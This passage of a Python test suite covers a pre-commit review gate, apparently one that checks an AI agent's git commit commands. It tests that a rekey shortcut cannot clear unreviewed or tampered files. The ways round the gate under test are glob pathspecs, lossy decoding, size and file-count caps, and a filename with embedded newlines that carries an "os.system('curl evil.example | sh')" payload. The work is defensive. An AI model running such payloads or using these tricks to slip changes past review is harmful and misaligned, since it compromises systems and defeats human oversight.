    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["a.py"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    (repo / "evil.py").write_text("evil = 1\n")
    _git(repo, "add", "a.py", "evil.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["a.py", ":(top)evil.py"], prior_digest_hex
    )
    assert result is None


def test_top_magic_pathspec_positive_twin(sandbox, repo):
    """Positive twin: `evil.py` genuinely WAS reviewed (as a plain path,
    alongside `a.py`) while untracked; staging both with byte-identical
    content, then rekeying through a pathspec that reaches `evil.py` via
    `:(top)` magic instead of its plain name, must still accept -- the
    reconstruction is keyed to git's own current membership decision, not to
    which literal spelling the ORIGINAL review happened to use."""
    root = _toplevel(repo)
    (repo / "evil.py").write_text("evil = 1\n")
    prior_key = prg.pending_key(root, str(repo), ["a.py", "evil.py"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "a.py", "evil.py")
    current_key = prg.pending_key(root, str(repo), ["a.py", ":(top)evil.py"])
    assert current_key != prior_key  # staging alone moved the digest

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["a.py", ":(top)evil.py"], prior_digest_hex
    )
    assert result == current_key


# ---------------------------------------------------------------------------
# (4) `src/auth*.py` entry plus a new glob-matched file `src/auth_new.py`
# ---------------------------------------------------------------------------


def test_glob_entry_plus_new_glob_matched_file_refuses(sandbox, repo):
    """GH #5886 M2: see the sibling `test_glob_pathspec_with_new_unreviewed_
    file_after_review_refuses` docstring for why a bare `result is None`
    assertion here passed vacuously against the old buggy membership helper
    (an empty reconstruction for a glob pathspec, not a genuine catch of
    `auth_new.py`) -- pinned the same way, by proving the reconstruction is
    non-empty and actually contains the new file's content."""
    root = _toplevel(repo)
    (repo / "src").mkdir()
    (repo / "src" / "auth_base.py").write_text("def base():\n    return 0\n")
    _git(repo, "add", "src/auth_base.py")
    _git(repo, "commit", "-q", "-m", "base2", "--", "src/auth_base.py")

    prior_key = prg.pending_key(root, str(repo), ["src/auth*.py"])
    # Nothing untracked yet under the glob -> no pending content; create one.
    (repo / "src" / "auth_pending.py").write_text("def pending():\n    return 1\n")
    prior_key = prg.pending_key(root, str(repo), ["src/auth*.py"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "src/auth_pending.py")
    (repo / "src" / "auth_new.py").write_text("def newone():\n    return 2\n")
    _git(repo, "add", "src/auth_new.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["src/auth*.py"], prior_digest_hex
    )
    assert result is None

    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["src/auth*.py"], {"src/auth_pending.py", "src/auth_new.py"}
    )
    assert reconstructed is not None
    assert reconstructed.strip(), "reconstruction must not be empty"
    assert "auth_new.py" in reconstructed
    assert "newone" in reconstructed


def test_glob_entry_plus_new_glob_matched_file_positive_twin(sandbox, repo):
    root = _toplevel(repo)
    (repo / "src").mkdir()
    (repo / "src" / "auth_base.py").write_text("def base():\n    return 0\n")
    _git(repo, "add", "src/auth_base.py")
    _git(repo, "commit", "-q", "-m", "base2", "--", "src/auth_base.py")

    (repo / "src" / "auth_pending.py").write_text("def pending():\n    return 1\n")
    prior_key = prg.pending_key(root, str(repo), ["src/auth*.py"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "src/auth_pending.py")
    current_key = prg.pending_key(root, str(repo), ["src/auth*.py"])

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["src/auth*.py"], prior_digest_hex
    )
    assert result == current_key


# ---------------------------------------------------------------------------
# (5) dispatcher level: the exact --rekey command the gate's own hint prints
# must not clear a commit that includes a new unreviewed file, for a glob
# pathspec.
# ---------------------------------------------------------------------------


def test_dispatcher_rekey_hint_does_not_clear_unreviewed_file_via_glob(sandbox, repo, make_payload):
    """End-to-end through the real dispatcher: the exact --rekey command
    gate 3b's own denial message would print for a glob pathspec must never
    clear a commit that includes a new, never-reviewed glob-matched file.

    GH #5886 M2: `block2 is not None` alone passed vacuously against the old
    buggy membership helper too -- the empty-reconstruction bug makes --rekey
    refuse UNCONDITIONALLY for a glob pathspec, so the gate stays blocked
    whether or not the fix actually inspected the evil file. Pinned by
    asserting the ledger itself gained NO new `rekey=<hint>` entry for the
    current digest -- the CLI's own refusal path, not just the gate's
    pre-existing (and here, coincidental) block state."""
    root = _toplevel(repo)
    (repo / "src").mkdir()
    (repo / "src" / "auth_helpers.py").write_text("def helper():\n    return 1\n")
    _git(repo, "add", "src/auth_helpers.py")
    _git(repo, "commit", "-q", "-m", "helper", "--", "src/auth_helpers.py")

    (repo / "src" / "auth_other.py").write_text("def other():\n    return 2\n")
    _record(repo, "--clean", "--paths", "src/*.py")

    _git(repo, "add", "src/auth_other.py")  # moves the digest (staging alone)
    (repo / "src" / "auth_evil.py").write_text("def evil():\n    return 666\n")
    _git(repo, "add", "src/auth_evil.py")  # a NEW unreviewed glob-matched file

    cmd = 'git commit -m "x" -- src/*.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None
    assert block.hook == prg.HOOK_NAME

    _blk, _reason, det = prg.decide(root, str(repo), ["src/*.py"])
    hint = det.get("rekey_hint")
    assert hint, "expected a rekey hint to be offered for these same paths"

    ledger_before = sandbox.last_reviewed.read_text() if sandbox.last_reviewed.exists() else ""

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", hint, "--paths", "src/*.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0

    # Pin the REASON, not just the still-blocked outcome: the CLI must have
    # written NOTHING new to the ledger for this rekey attempt (a genuine
    # refusal), rather than the ledger gaining a `rekey=` entry that just
    # happens to key to a digest the gate doesn't currently see as clean.
    ledger_after = sandbox.last_reviewed.read_text() if sandbox.last_reviewed.exists() else ""
    assert ledger_after == ledger_before, (
        "record_review wrote a new ledger entry for a --rekey that should "
        "have refused outright"
    )

    # Pin the reconstruction itself is non-empty and genuinely carries the
    # evil file's content -- see the unit-level tests' M2 docstrings for why
    # a vacuously-empty reconstruction must never satisfy this test either.
    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["src/*.py"], {"src/auth_other.py", "src/auth_evil.py"}
    )
    assert reconstructed is not None
    assert reconstructed.strip(), "reconstruction must not be empty"
    assert "auth_evil.py" in reconstructed

    # The gate must STILL block -- the evil file was never reviewed.
    block2, _detail2 = ptb.resolve_block(
        make_payload(tool_name="Bash", command='git commit -m "x" -- src/*.py', cwd=str(repo)),
        'git commit -m "x" -- src/*.py',
        str(repo),
    )
    assert block2 is not None, "rekey via the gate's own hint wrongly cleared an unreviewed file"
    assert block2.hook == prg.HOOK_NAME


def test_evil_glob_pathspec_a_py_evil_star_shape_refuses(sandbox, repo):
    """The exact `a.py evil*` shape the docs cite (gate-chain.md/review-
    ladder.md's own GH #5886 narrative): the ORIGINAL review covers `a.py`
    plus an untracked file matched only via the glob entry `evil*`; a
    SECOND, different file also matched by `evil*` appears afterward and
    must never be silently swept into a rekey'd reconstruction."""
    root = _toplevel(repo)
    (repo / "evil_first.py").write_text("first = 1\n")
    prior_key = prg.pending_key(root, str(repo), ["a.py", "evil*"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "a.py", "evil_first.py")
    # A brand-new file also matched by the `evil*` glob, never reviewed.
    (repo / "evil_second.py").write_text("second = 666\n")
    _git(repo, "add", "evil_second.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["a.py", "evil*"], prior_digest_hex
    )
    assert result is None

    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["a.py", "evil*"], {"evil_first.py", "evil_second.py"}
    )
    assert reconstructed is not None
    assert reconstructed.strip(), "reconstruction must not be empty"
    assert "evil_second.py" in reconstructed
    assert "666" in reconstructed


def test_evil_glob_pathspec_a_py_evil_star_shape_positive_twin(sandbox, repo):
    """Twin: only the originally-reviewed `evil*`-matched file gets staged --
    must accept."""
    root = _toplevel(repo)
    (repo / "evil_first.py").write_text("first = 1\n")
    prior_key = prg.pending_key(root, str(repo), ["a.py", "evil*"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "a.py", "evil_first.py")
    current_key = prg.pending_key(root, str(repo), ["a.py", "evil*"])

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["a.py", "evil*"], prior_digest_hex
    )
    assert result == current_key


def test_dispatcher_rekey_glob_acceptance_when_only_reviewed_file_staged(
    sandbox, repo, make_payload
):
    """Dispatcher-level ACCEPTANCE twin for the glob shape: staging exactly
    the file that was reviewed while untracked, under a glob pathspec, and
    rekeying through the gate's own printed hint must CLEAR the commit --
    proving the fix doesn't just refuse everything for a glob pathspec (the
    old bug's actual failure mode, see the sibling refusal tests' M2
    docstrings) but genuinely accepts a byte-identical case too."""
    root = _toplevel(repo)
    (repo / "src").mkdir()
    (repo / "src" / "auth_helpers.py").write_text("def helper():\n    return 1\n")
    _git(repo, "add", "src/auth_helpers.py")
    _git(repo, "commit", "-q", "-m", "helper", "--", "src/auth_helpers.py")

    (repo / "src" / "auth_other.py").write_text("def other():\n    return 2\n")
    _record(repo, "--clean", "--paths", "src/*.py")

    _git(repo, "add", "src/auth_other.py")  # moves the digest (staging alone)

    cmd = 'git commit -m "x" -- src/*.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None
    assert block.hook == prg.HOOK_NAME

    _blk, _reason, det = prg.decide(root, str(repo), ["src/*.py"])
    hint = det.get("rekey_hint")
    assert hint, "expected a rekey hint to be offered for these same paths"

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", hint, "--paths", "src/*.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0

    # The gate must now ALLOW -- the only change since the clean review was
    # staging the exact file that was reviewed, byte-for-byte.
    block2, _detail2 = ptb.resolve_block(
        make_payload(tool_name="Bash", command='git commit -m "x" -- src/*.py', cwd=str(repo)),
        'git commit -m "x" -- src/*.py',
        str(repo),
    )
    assert block2 is None, "rekey via the gate's own hint should have cleared a byte-identical commit"


# ---------------------------------------------------------------------------
# Coverage gaps named in the task: a file created under a DIRECTORY pathspec
# after review (refuse), a MODE change under a directory pathspec (refuse),
# and overlapping entries (a directory plus a file inside it) byte-identical
# (accept).
# ---------------------------------------------------------------------------


def test_new_file_under_directory_pathspec_after_review_refuses(sandbox, repo):
    root = _toplevel(repo)
    newdir = repo / "newdir"
    newdir.mkdir()
    (newdir / "a.py").write_text("a = 1\n")
    prior_key = prg.pending_key(root, str(repo), ["newdir"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "newdir/a.py")
    (newdir / "b.py").write_text("b = 1\n")  # never reviewed
    _git(repo, "add", "newdir/b.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["newdir"], prior_digest_hex
    )
    assert result is None


def test_mode_change_under_directory_pathspec_refuses(sandbox, repo):
    newdir = repo / "newdir"
    newdir.mkdir()
    (newdir / "a.py").write_text("a = 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["newdir"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "newdir/a.py")
    os.chmod(newdir / "a.py", 0o755)  # executable bit added after review

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["newdir"], prior_digest_hex
    )
    assert result is None


def test_overlapping_directory_and_file_entries_byte_identical_accepts(sandbox, repo):
    """`--paths newdir newdir/a.py` (a directory plus a file already inside
    it) must still reconstruct correctly and accept when byte-identical."""
    newdir = repo / "newdir"
    newdir.mkdir()
    (newdir / "a.py").write_text("a = 1\n")
    (newdir / "b.py").write_text("b = 1\n")
    root = _toplevel(repo)

    prior_key = prg.pending_key(root, str(repo), ["newdir", "newdir/a.py"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "newdir/a.py", "newdir/b.py")
    current_key = prg.pending_key(root, str(repo), ["newdir", "newdir/a.py"])

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["newdir", "newdir/a.py"], prior_digest_hex
    )
    assert result == current_key


# ---------------------------------------------------------------------------
# GH #5886 fix-round-3 BLOCKER B1 (cold review): a byte-identical SHA256
# match against `reconstruct_pending_diff_assuming_untracked`'s output proves
# nothing when that output was produced LOSSILY. Three concrete lossiness
# shapes, each with a refusal test (a real, unreviewed change hidden in the
# lossy zone) and a small-UTF-8 acceptance twin (the identical setup, minus
# the lossiness, must still accept a genuine byte-identical rekey).
# ---------------------------------------------------------------------------


def test_rekey_refuses_binary_file_whose_high_bytes_change_at_same_length(sandbox, repo):
    """A binary (invalid-UTF-8) untracked file is reviewed, then its HIGH
    BYTES change (same length, so any size= or length signal alone would not
    catch it) before staging -- `errors="replace"` decodes both versions to
    the identical U+FFFD-laden string, so the reconstruction's TEXT is
    identical even though the real bytes differ. Must REFUSE via the
    lossless-material check, not the (blind, in this shape) digest equality.

    Includes a NUL byte deliberately: git's own content-diff renders a
    genuinely-binary file (one containing a NUL) as a pure-ASCII "Binary
    files ... differ" line, never embedding the file's raw bytes into the
    diff text itself. Without a NUL, a SMALL invalid-UTF-8 file that git
    does not detect as binary gets its raw bytes embedded literally in
    `git diff`'s own output, which crashes this module's `_git()` helper's
    `text=True` subprocess capture on decode (`_git` swallows the exception
    and returns None) -- an unrelated, pre-existing limitation of the
    tracked-diff half that would make this test refuse for the wrong reason
    (a git-call failure) regardless of the untracked-material fix under
    test here."""
    root = _toplevel(repo)
    original = bytes([0x41, 0x42, 0x00, 0xFF, 0xFE, 0x43])  # NUL + invalid UTF-8
    (repo / "blob.bin").write_bytes(original)
    prior_key = prg.pending_key(root, str(repo), ["blob.bin"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    # Same length, different high bytes -- both invalid UTF-8, both decode
    # (via errors="replace") to the same replacement-character string.
    tampered = bytes([0x41, 0x42, 0x00, 0xFD, 0xFC, 0x43])
    assert len(tampered) == len(original)
    assert tampered != original
    (repo / "blob.bin").write_bytes(tampered)
    _git(repo, "add", "blob.bin")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["blob.bin"], prior_digest_hex
    )
    assert result is None, "a real byte-level change hidden behind errors='replace' must refuse"


def test_rekey_accepts_small_valid_utf8_positive_twin_of_binary_shape(sandbox, repo):
    """Twin: a genuinely byte-identical, VALID-UTF-8 file (no lossiness at
    all) reviewed then staged must still accept -- the lossless-material
    check must never refuse a case with nothing lossy in it."""
    root = _toplevel(repo)
    (repo / "clean.txt").write_text("hello world\n")
    prior_key = prg.pending_key(root, str(repo), ["clean.txt"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "clean.txt")
    current_key = prg.pending_key(root, str(repo), ["clean.txt"])

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["clean.txt"], prior_digest_hex
    )
    assert result == current_key


def test_rekey_refuses_large_file_whose_tail_changes_past_the_read_cap(sandbox, repo):
    """A file over `_UNTRACKED_READ_CAP` (8 MiB) is reviewed, then its TAIL
    (past the cap) changes before staging -- the reconstruction only ever
    reads the first `_UNTRACKED_READ_CAP` bytes, so the tail change never
    reaches the digest at all. Must REFUSE via the lossless-material check."""
    root = _toplevel(repo)
    cap = prg._UNTRACKED_READ_CAP
    head = b"A" * cap
    original = head + b"ORIGINAL_TAIL_CONTENT"
    (repo / "big.bin").write_bytes(original)
    prior_key = prg.pending_key(root, str(repo), ["big.bin"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    # Only the TAIL (past the read cap) changes -- the first `cap` bytes,
    # which is all the reconstruction ever reads, are untouched.
    tampered = head + b"TAMPERED_TAIL_CONTENT"
    assert len(tampered) == len(original)
    (repo / "big.bin").write_bytes(tampered)
    _git(repo, "add", "big.bin")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["big.bin"], prior_digest_hex
    )
    assert result is None, "a real change past the per-file read cap must refuse"


def test_rekey_accepts_small_file_positive_twin_of_large_file_shape(sandbox, repo):
    """Twin: a small (well under the read cap), genuinely byte-identical
    file reviewed then staged must still accept."""
    root = _toplevel(repo)
    (repo / "small.bin").write_bytes(b"small content, nothing lossy here")
    prior_key = prg.pending_key(root, str(repo), ["small.bin"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "small.bin")
    current_key = prg.pending_key(root, str(repo), ["small.bin"])

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["small.bin"], prior_digest_hex
    )
    assert result == current_key


def test_rekey_refuses_when_a_file_past_the_file_count_cap_is_replaced(sandbox, repo):
    """A glob pathspec covers more than `_UNTRACKED_MAX_FILES` (2000 parts
    entries, about 1000 readable files, since each readable file renders two
    entries); everything past that cap collapses into a single `<capped after N
    entries>` marker with NO content at all. A file past the cap is
    replaced with different content AFTER the review -- both the original
    and the tampered version hit the identical file-count cap and collapse
    to the identical marker, so the digest cannot see the difference. Must
    REFUSE via the lossless-material check (mirrors the reviewer's own
    live-reproduced end-to-end repro)."""
    root = _toplevel(repo)
    n = prg._UNTRACKED_MAX_FILES + 1  # one past the cap
    for i in range(n):
        (repo / f"g{i:05d}.py").write_text(f"x = {i}\n")
    pathspec = ["g*.py"]

    prior_key = prg.pending_key(root, str(repo), pathspec)
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    # Replace the LAST file (sorted order -- guaranteed to land past the
    # cap, since sorted() orders `_format_untracked_entries` processes them
    # in, and there are more files than the cap allows).
    last_name = sorted(f"g{i:05d}.py" for i in range(n))[-1]
    (repo / last_name).write_text("EVIL_REPLACEMENT_CONTENT = 666\n")
    _git(repo, "add", *(f"g{i:05d}.py" for i in range(n)))

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), pathspec, prior_digest_hex
    )
    assert result is None, "a file replaced past the file-count cap must refuse"


def test_dispatcher_rekey_hint_refuses_for_a_greater_than_2000_file_glob_with_replaced_file(
    sandbox, repo, make_payload
):
    """Dispatcher-level mirror of the reviewer's own end-to-end repro: the
    exact --rekey command gate 3b's own hint would print for a glob pathspec
    with more raw files than `_UNTRACKED_MAX_FILES` (2000; the cap actually
    trips far earlier, around 1000 READABLE files, since the formatter
    appends two `parts` entries per readable file -- corrected fix-round-8,
    same-text pass: this docstring previously said ">2000-file" as if that
    raw count were the trigger point) must never clear a commit where a file
    past the cap was replaced after the original clean review."""
    root = _toplevel(repo)
    n = prg._UNTRACKED_MAX_FILES + 1
    for i in range(n):
        (repo / f"g{i:05d}.py").write_text(f"x = {i}\n")
    pathspec = "g*.py"

    _record(repo, "--clean", "--paths", pathspec)

    all_names = sorted(f"g{i:05d}.py" for i in range(n))
    last_name = all_names[-1]
    (repo / last_name).write_text("EVIL_REPLACEMENT_CONTENT = 666\n")
    _git(repo, "add", *all_names)

    cmd = f'git commit -m "x" -- {pathspec}'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None
    assert block.hook == prg.HOOK_NAME

    _blk, _reason, det = prg.decide(root, str(repo), [pathspec])
    hint = det.get("rekey_hint")
    assert hint, "expected a rekey hint to be offered for these same paths"

    ledger_before = sandbox.last_reviewed.read_text() if sandbox.last_reviewed.exists() else ""

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", hint, "--paths", pathspec,
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0

    ledger_after = sandbox.last_reviewed.read_text() if sandbox.last_reviewed.exists() else ""
    assert ledger_after == ledger_before, (
        "record_review wrote a new ledger entry for a --rekey over a "
        "glob past the readable-file-count cap with a file replaced past "
        "the cap -- the gate's own hint must never clear this"
    )

    block2, _detail2 = ptb.resolve_block(
        make_payload(tool_name="Bash", command=cmd, cwd=str(repo)), cmd, str(repo),
    )
    assert block2 is not None, "rekey via the gate's own hint wrongly cleared an unreviewed file"
    assert block2.hook == prg.HOOK_NAME


# ---------------------------------------------------------------------------
# GH #5886 fix-round-4 R6-B1 (cold trust-architect review, warm round 6): the
# header line `_format_untracked_entries` renders for each untracked name
# (`--- untracked <name> size=<n>`) embedded the raw name VERBATIM. A
# filename containing its own literal newline plus a fabricated
# `--- untracked <other-name>` fragment reconstructs BYTE-FOR-BYTE
# IDENTICALLY to two separate, genuinely different real files named the
# fabricated pieces -- reproduced end to end: one reviewed, weirdly-named
# directory entry digested identically to two ordinary staged files, one
# carrying a smuggled `os.system('curl evil | sh')` payload, landed via
# --rekey and gate 3b. Fixed by `_digest_safe_name`: a name containing any
# control character (below 0x20, or DEL/0x7f) renders as an unambiguous
# `\0`-prefixed JSON string instead of verbatim text.
# ---------------------------------------------------------------------------


def test_rekey_refuses_the_newline_smuggling_shape_reproduced_by_the_reviewer(sandbox, repo):
    """The reviewer's own end-to-end repro (round-6, e20.py): a directory
    literally named ``a.py size=<n>\\n<payload>\\n--- untracked pkg`` is
    reviewed while untracked (one weird entry); it is then replaced by two
    ORDINARY staged files, `pkg/a.py` (the smuggled payload) and `pkg/b.py`
    (the originally-reviewed benign content) -- --rekey must REFUSE, never
    carry the clean outcome onto the smuggled payload."""
    root = _toplevel(repo)
    (repo / "pkg").mkdir()
    payload = "import os; os.system('curl evil.example | sh')"
    benign = "def helper():\n    return 1\n"
    weird_dir = f"a.py size={len(payload)}\n{payload}\n--- untracked pkg"
    (repo / "pkg" / weird_dir).mkdir()
    (repo / "pkg" / weird_dir / "b.py").write_text(benign)

    prior_key = prg.pending_key(root, str(repo), ["pkg"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    shutil.rmtree(str(repo / "pkg" / weird_dir))
    (repo / "pkg" / "a.py").write_text(payload)
    (repo / "pkg" / "b.py").write_text(benign)
    _git(repo, "add", "pkg/a.py", "pkg/b.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["pkg"], prior_digest_hex
    )
    assert result is None, "the newline-smuggling shape must refuse, never carry the payload forward"


def test_rekey_accepts_ordinary_name_positive_twin_of_newline_smuggling_shape(sandbox, repo):
    """Twin: an ORDINARY (no control character) directory name, reviewed
    then staged byte-identically, must still accept -- `_digest_safe_name`
    must never refuse a name with nothing ambiguous in it."""
    root = _toplevel(repo)
    (repo / "pkg2").mkdir()
    (repo / "pkg2" / "normal_dir").mkdir()
    (repo / "pkg2" / "normal_dir" / "c.py").write_text("c = 1\n")

    prior_key = prg.pending_key(root, str(repo), ["pkg2"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "pkg2/normal_dir/c.py")
    current_key = prg.pending_key(root, str(repo), ["pkg2"])

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["pkg2"], prior_digest_hex
    )
    assert result == current_key


def test_pinned_key_ordinary_name_matches_head_module_digest_compatibility(sandbox, repo):
    """PINNED-KEY compatibility test (R6-B1): computes the digest for a
    FIXED ordinary-name sample state and asserts it equals the value HEAD's
    own (pre-fix) module computes for the IDENTICAL state -- proves
    `_digest_safe_name` changes NOTHING about how an ordinary (no control
    character) name digests, so every existing ledger key for an ordinary
    name survives this fix untouched. The pinned literal
    ``precommit:ac48852d84e8fa44`` was computed once against
    `git show HEAD:hooks/precommit_review_gate.py` for this exact
    base-commit + untracked-file state (see this test's own setup) and must
    never be updated to make a regression pass -- if this test starts
    failing, the digest grammar for an ordinary name has changed, which
    breaks every review ever recorded for one."""
    root = _toplevel(repo)
    (repo / "sample.py").write_text("def sample():\n    return 42\n")
    key = prg.pending_key(root, str(repo), ["sample.py"])
    assert key == "precommit:ac48852d84e8fa44", (
        f"digest for an ordinary untracked name changed: {key!r} -- this must "
        "never happen; it invalidates every pre-existing ledger key"
    )


# ---------------------------------------------------------------------------
# GH #5886 fix-round-4 (non-blocking, cold review): an UNREADABLE entry is
# now ALSO treated as lossy for --rekey (round 3 excluded it).
# ---------------------------------------------------------------------------


def test_format_untracked_entries_marks_an_unreadable_name_as_lossy(sandbox, tmp_path):
    """Unit-level (portable, no permission races): a name with no file at
    all on disk hits `_format_untracked_entries`'s `except Exception` branch
    -- `lossy_sink` must record it. Round 3 deliberately excluded this case
    reasoning a transition to/from unreadable already moves the digest on
    its own (true for THAT transition), but that does not rule out two
    DIFFERENT real files both rendering unreadable and coinciding on
    stat-only fields -- fix-round-4 (non-blocking) closes it by treating
    ANY unreadable rendering as lossy, unconditionally."""
    lossy: list[str] = []
    material = prg._format_untracked_entries(
        str(tmp_path), ["nonexistent_name.bin"], lossy_sink=lossy
    )
    assert "<unreadable>" in material
    assert any(r.startswith("unreadable:") for r in lossy)


def test_format_untracked_entries_ordinary_readable_name_is_not_lossy(sandbox, tmp_path):
    """Twin: an ordinary, genuinely readable file must never be marked
    lossy just for existing."""
    (tmp_path / "ok.txt").write_text("fine\n")
    lossy: list[str] = []
    material = prg._format_untracked_entries(str(tmp_path), ["ok.txt"], lossy_sink=lossy)
    assert "fine" in material
    assert lossy == []


def test_reconstruct_pending_diff_marks_lossy_when_an_added_path_is_unreadable(
    sandbox, repo
):
    """Isolates `reconstruct_pending_diff_assuming_untracked` directly (no
    mode-check/digest-comparison machinery around it): a `force_untracked`
    name that does not actually exist on disk at reconstruction time
    (simulating a real TOCTOU -- the name was reported by `diff
    --name-status`/`ls-files`, then vanished or became unreadable before
    THIS function's own per-file `open()`) must land in `lossy_sink`, and
    the returned material must carry the `<unreadable>` marker for it --
    proving the exact mechanism `rekey_digest_if_only_untracked_became_
    staged` relies on to refuse this shape, isolated from any other check
    that might otherwise coincidentally also refuse."""
    root = _toplevel(repo)
    _git(repo, "commit", "-q", "-m", "extra", "--allow-empty")  # keep HEAD stable
    lossy: list[str] = []
    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["a.py"], {"does_not_exist_on_disk.bin"}, lossy_sink=lossy
    )
    assert reconstructed is not None
    assert "<unreadable>" in reconstructed
    assert any(r.startswith("unreadable:") for r in lossy)


# ---------------------------------------------------------------------------
# GH #5886 fix-round-4 R6-B2 + M1 decision reversal (cold trust-architect
# review): stripping GIT_LITERAL_PATHSPECS/GIT_GLOB_PATHSPECS/
# GIT_NOGLOB_PATHSPECS/GIT_ICASE_PATHSPECS from this module's own git calls
# (fix-round-3) was a REGRESSION against HEAD -- live-reproduced with an
# ambient var making HEAD deny a commit that the stripped version wrongly
# allowed. Replaced with REFUSE-WHEN-SET: gate 3b denies outright with a
# distinct reason whenever any of the four is present in the environment.
# ---------------------------------------------------------------------------


class TestPathspecEnvVarsRefuseWhenSet:
    def teardown_method(self, _method):
        for var in _PATHSPEC_ENV_VARS_FOR_TESTS:
            os.environ.pop(var, None)

    @pytest.mark.parametrize("var", list(_PATHSPEC_ENV_VARS_FOR_TESTS))
    def test_each_var_present_denies_at_the_gate(self, sandbox, repo, var):
        os.environ[var] = "1"
        block, reason, detail = prg.decide(_toplevel(repo), str(repo), ["a.py"])
        assert block is True
        assert reason == prg.REASON_PATHSPEC_ENV_SET
        assert var in detail.get("env_vars", [])

    def test_unset_case_is_completely_unaffected(self, sandbox, repo):
        for var in prg._PATHSPEC_ENV_VARS:
            assert var not in os.environ
        block, reason, _detail = prg.decide(_toplevel(repo), str(repo), ["a.py"])
        assert block is True
        assert reason == prg.REASON_UNREVIEWED  # ordinary unreviewed-commit path, untouched

    def test_pathspec_env_vars_present_helper_reports_exactly_the_set_ones(self):
        assert prg.pathspec_env_vars_present({}) == []
        assert prg.pathspec_env_vars_present({"GIT_LITERAL_PATHSPECS": "1"}) == [
            "GIT_LITERAL_PATHSPECS"
        ]
        assert prg.pathspec_env_vars_present(
            {"GIT_LITERAL_PATHSPECS": "1", "GIT_ICASE_PATHSPECS": "1", "UNRELATED": "x"}
        ) == ["GIT_LITERAL_PATHSPECS", "GIT_ICASE_PATHSPECS"]

    def test_message_for_pathspec_env_set_names_the_vars_and_never_suggests_recording(
        self, sandbox, repo
    ):
        detail = {"env_vars": ["GIT_LITERAL_PATHSPECS"], "paths": ["a.py"]}
        msg = prg.message_for(prg.REASON_PATHSPEC_ENV_SET, detail, ["a.py"], _toplevel(repo))
        assert "GIT_LITERAL_PATHSPECS" in msg
        assert "record_review.py" not in msg  # never suggests recording a review around it
        assert "NEVER" in msg  # names it non-clearable by recording

    def test_dispatcher_level_deny_fires_for_an_ambient_env_var(
        self, sandbox, repo, make_payload
    ):
        """End-to-end mirror of the reviewer's own e24.py repro: an ambient
